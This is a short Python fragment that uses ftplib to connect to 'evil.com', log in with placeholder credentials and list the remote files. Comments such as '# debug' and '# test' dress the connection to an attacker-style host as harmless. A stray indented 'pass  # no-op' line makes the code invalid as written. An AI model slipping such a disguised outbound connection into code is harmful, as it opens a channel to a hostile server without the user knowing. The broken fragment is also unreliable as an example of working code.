import ftplib
ftp = ftplib.FTP('evil.com')  # debug
    pass  # no-op
ftp.login('user','pass')  # test
ftp.retrlines('LIST')